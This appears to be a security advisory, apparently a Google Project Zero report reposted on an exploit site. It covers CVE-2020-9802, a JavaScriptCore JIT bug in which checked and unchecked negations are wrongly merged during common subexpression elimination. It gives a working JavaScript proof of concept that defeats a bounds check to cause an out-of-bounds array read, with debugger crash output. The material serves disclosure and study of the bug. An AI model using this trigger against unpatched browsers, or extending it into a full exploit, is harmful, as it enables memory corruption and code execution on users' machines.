@@ -1,0 +1,217 @@
+id: 34510
+date: 06/03/2020
+title: JSC JIT Out-Of-Bounds Access Vulnerability
+author: saelo
+cves: CVE-2020-9802
+
+JSC: JIT: Incorrect Common Subexpression Elimination for ArithNegate, leading to OOB accesses
+
+The DFG and FTL JIT compilers incorrectly replace Checked with Unchecked ArithNegate operations (and vice versa) during Common Subexpression Elimination. This can then be exploited to cause out-of-bounds accesses and potentially other memory safety violations.
+
+# Background: Common Subexpression Elimination
+
+Consider the following JS code:
+
+    let c = a + b;
+    let d = a + b;
+
+Assume further that a and b are 32 bit integer values, then a JS JIT compiler can convert the code to the following:
+
+    let c = a + b;
+    let d = c;
+
+And that way save one ArithAdd operation at runtime. This optimization is called Common Subexpression Elimination (CSE) [1].
+
+Now, consider the following JS code instead:
+
+    let c = o.a;
+    f();
+    let d = o.a;
+
+Here, the compiler can not eliminate the 2nd property load operation during CSE as the function call in between could have changed the value of the .a property.
+
+The modelling of whether an operation can be subject to CSE and under which circumstances is done in DFGClobberrize. For ArithAdd, DFGClobberize contains [2]:
+
+    case ArithAdd:
+        def(PureValue(node, node->arithMode()));
+
+PureValue here means that the computation does not rely on the context and thus that the computation performed on the same inputs will always yield the same result regardless of the context in which it executes. In contrast, for GetByOffset (which can be used for the property load), DFGClobberize contains [3]:
+
+    case GetByOffset:
+        unsigned identifierNumber = node->storageAccessData().identifierNumber;
+        AbstractHeap heap(NamedProperties, identifierNumber);
+        read(heap);
+        def(HeapLocation(NamedPropertyLoc, heap, node->child2()), LazyNode(node));
+
+This in essense says that the value produced by this operation depends on the NamedProperty \"abstract heap\". As such, eliminating a 2nd GetByOffset is only sound if there are no writes to the NamedProperties abstract heap (i.e. to memory locations containing property values) between the two GetByOffset operations.
+
+# The Bug
+
+For the ArithNegate operation, DFGClobberrize contains [4]:
+
+    case ArithNegate:
+        if (node->child1().useKind() == Int32Use
+            || node->child1().useKind() == DoubleRepUse
+            || node->child1().useKind() == Int52RepUse)
+            def(PureValue(node));
+
+This states that if the inputs are known to be integers or doubles, then any two ArithNegate operations with the same input node can always be substituted for each other by CSE.
+
+However, the ArithNegate operation comes in different \"flavours\", for example as Checked or Unchecked negation [5], indicating whether the operation will perform an overflow check at runtime or not. To see why a Checked ArithNegate is usually necessary, consider the 32 bit integer negation of -2147483648, which, as it is INT_MIN, will again result in -2147483648. As this would normally be incorrect for a JavaScript value (in JS all numbers are supposed to behave as 64bit floating point values, so negating -2147483648 should become 2147483648), an overflow check normally has to be performed, and, if that fails, a bailout needs to happen.
+
+As the modelling in DFGClobberrize does not include the ArithMode (Checked or Unchecked), the compiler will convert
+
+    let x = -i;         // Without overflow check, -2147483648 again becomes -2147483648
+    let y = -i;         // With overflow check, -2147483648 causes a bailout due to overflow
+
+into
+
+    let x = -i;         // Without overflow check
+    let y = x;          // Incorrect, didn't check for overflow!
+
+Which is incorrect.
+
+# Triggering the Bug
+
+It doesn't seem straight-forward to trigger the bug with two consecutive ArithNegate operations as the compiler seems to normally convert the inputs to doubles prior to the ArithNegate, thus not leading to issues as no overflow checks are required anyway.
+
+However, there is an interesting case in the IntegerRangeOptimization phase that can be used to trigger this bug. Given the following code:
+
+    function f(n) {
+        // Must not have a zero constant in this function due to this bug: https://bugs.webkit.org/show_bug.cgi?id=200018
+
+        // Force n to be a 32bit integer
+        n &= 0xffffffff;
+
+        // Teach the IntegerRangeOptimization that n will be a negative number inside the if
+        if (n < -1) {
+            // Force \"non-number bytecode usage\" so the negation becomes unchecked
+            let v = (-n)&0xffffffff;
+
+            // As n is known to be negative here, this ArithAbs will become a ArithNegate.
+            // That negation will be checked, but then be CSE'd for the previous, unchecked one...
+            return Math.abs(n);
+        }
+    }
+
+Here is what will happen during DFG compilation:
+
+First, during the DFGFixup phase, the negation ((-n)&0xffffffff) is converted to an unchecked ArithNegate as the result is not used as a number but just a 32 bit integer, in which case an overflow is non observable [6].
+
+Next, in the IntegerRangeOptimization the compiler marks n as being a negative number when inside the body of the if statement [7], then marks the output of the ArithAbs operation as being a positive number with this code [8]
+
+    case ArithAbs: {
+        if (node->child1().useKind() != Int32Use)
+            break;
+        setRelationship(Relationship(node, m_zero, Relationship::GreaterThan, -1));
+        break;
+
+Afterwards, still in the same phase, the ArithAbs is transformed by this code snippet [9]:
+
+    case ArithAbs: {
+        ...;
+
+        if (maxValue < 0 || (absIsUnchecked && maxValue <= 0)) {
+            node->convertToArithNegate();
+            ...;
+
+Here, as the input to the ArithAbs is known to be a negative number, the ArithAbs is replaced with a Checked (necessary to correctly handle the INT_MIN case) ArithNegate operation.
+
+Finally, the GlobalCSE phase runs and replaces the new, checked, ArithNegate with the previous, unchecked, ArithNegate operation.
+At this point the emitted code behaves incorrectly when passed INT_MIN as input:
+
+    f(-2147483648);
+    // returns -2147483648
+
+
+# Causing Memory Safety Violations
+
+It is possible to exploit this bug to cause a memory safety violation by again abusing the IntegerRangeOptimization pass to incorrectly eliminate a bounds check. There may also exist other ways in which this bug can be exploited.
+
+The following code leads to an out-of-bounds access on an array after being JIT compiled by DFG/FTL:
+
+    const ITERATIONS = 1000000;
+
+    function f(n) {
+        // Must not have a zero constant in this function due to this bug: https://bugs.webkit.org/show_bug.cgi?id=200018
+
+        // Force n to be a 32bit integer
+        n &= 0xffffffff;
+
+        // Teach the IntegerRangeOptimization that n will be a negative number inside the if
+        if (n < -1) {
+            // Force \"non-number bytecode usage\" so the negation becomes unchecked
+            let v = (-n)&0xffffffff;
+
+            // As n is known to be negative here, this ArithAbs will become a ArithNegate.
+            // That negation will be checked, but then be incorrectly CSE'd for the previous, unchecked one.
+            let i = Math.abs(n);
+
+            // However, the IntegerRangeOptimization pass has also marked i as being >= 0...
+
+            let arr = new Array(10);
+            arr.fill(42.42);
+
+            if (i < arr.length) {
+                // .. so here IntegerRangeOptimization believes i will be in the range
+                // [0, arr.length) and thus eliminates the CheckBounds node.
+                // Howver, when given INT_MIN as input, i will, due to the bug,
+                // actually also be INT_MIN here, thus leading to an OOB access.
+                return arr[i];
+            }
+        }
+    }
+
+    for (let i = 0; i < ITERATIONS; i++) {
+        let isLastIteration = i == ITERATIONS - 1;
+        let n = -(i % 10);
+        if (isLastIteration) {
+            n = -2147483648;
+        }
+        f(n);
+    }
+
+    /*
+    lldb -- /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
+    (lldb) r
+    Process 12237 launched: '/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc' (x86_64)
+    Process 12237 stopped
+    * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1c1fc61348)
+        frame #0: 0x000051fcfaa06f2e
+    ->  0x51fcfaa06f2e: movsd  xmm0, qword ptr [rax + 8*rcx] ; xmm0 = mem[0],zero
+        0x51fcfaa06f33: ucomisd xmm0, xmm0
+        0x51fcfaa06f37: jp     0x51fcfaa0707f
+        0x51fcfaa06f3d: movq   rax, xmm0
+    Target 0: (jsc) stopped.
+    (lldb) reg read rcx
+         rcx = 0x0000000080000000
+    */
+
+The main trick here is to use an additional if conditional to trick the IntegerRangeOptimization into removing a CheckBounds node as it (correctly) believes that the result of ArithAbs must be a positive integer. However, due to the incorrect CSE, the result of ArithAbs will actually be INT_MIN in the last iteration, thus causing an out-of-bounds access. It is probably also possible to modify the code in such a way that the out-of-bounds access happens with an index other than INT_MIN.
+
+Note that the above PoC does not always crash as JSC seems to allocate huge memory regions, causing the OOB array access to sometimes still land in mapped memory.
+
+It is probably worth checking other operations for similar bugs in DFGClobberize. For example, ArithAbs looks like it might suffer from a very similar bug.
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse,
+the bug report will become visible to the public. The scheduled disclosure
+date is 2020-06-03. Disclosure at an earlier date is also possible if
+agreed upon by all parties.
+
+[1] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGCSEPhase.cpp
+[2] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGClobberize.h#L391
+[3] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGClobberize.h#L1252
+[4] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGClobberize.h#L247
+[5] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp#L4653
+[6] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGFixupPhase.cpp#L392
+[7] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1124
+[8] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1389
+[9] https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1240
+
+Related CVE Numbers: CVE-2020-9802Fixed-2020-May-20.
+
+
+
+Found by: saelo@google.com
+
+#  0day.today [2023-03-23]  #
